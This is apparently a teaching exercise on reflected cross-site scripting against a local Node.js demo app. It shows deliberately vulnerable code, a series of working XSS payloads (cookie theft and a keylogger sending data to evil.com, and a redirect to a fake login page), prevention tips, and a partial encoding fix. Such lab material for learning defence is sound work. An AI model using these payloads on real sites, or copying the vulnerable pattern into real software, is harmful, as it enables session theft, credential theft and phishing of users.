# Cross-Site Scripting (XSS) Exercise

## Objective
Learn how XSS vulnerabilities allow attackers to inject malicious scripts into web pages.

## What is XSS?
Cross-Site Scripting (XSS) occurs when user input is displayed on a page without proper encoding, allowing attackers to inject and execute malicious JavaScript.

## Vulnerable Code
```javascript
const name = req.query.name || 'Guest';
res.send(`<h1>Hello ${name}</h1>`);
```

## Exercise Instructions

### Step 1: Basic XSS
Try injecting a simple script:
```
http://localhost:3000/xss?name=<script>alert('XSS')</script>
```

### Step 2: Image-based XSS
Try using an image tag with an error handler:
```
http://localhost:3000/xss?name=<img src=x onerror=alert('XSS')>
```

### Step 3: Stealing Cookies
Try injecting a script to steal cookies:
```
http://localhost:3000/xss?name=<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
```

### Step 4: Keylogger
Try injecting a keylogger:
```
http://localhost:3000/xss?name=<script>document.onkeypress=function(e){fetch('http://evil.com/log?key='+e.key)}</script>
```

### Step 5: Phishing
Try redirecting users to a fake login page:
```
http://localhost:3000/xss?name=<script>window.location='http://evil.com/fake-login.html'</script>
```

## Expected Results
- Simple alert should pop up
- Scripts should execute in the browser context
- Can demonstrate cookie theft (in a real scenario)

## Prevention
1. Encode user input before displaying it
2. Use Content Security Policy (CSP)
3. Implement input validation
4. Use framework-provided XSS protection

## Secure Code Example
```javascript
const name = req.query.name || 'Guest';
const encodedName = name.replace(/</g, '&lt;').replace(/>/g, '&gt;');
res.send(`<h1>Hello ${encodedName}</h1>`);
```

## Using Browser DevTools
1. Open browser Developer Tools (F12)
2. Go to Console tab
3. Try: `document.cookie` to see cookies
4. Try: `document.querySelector('input').value` to steal form data
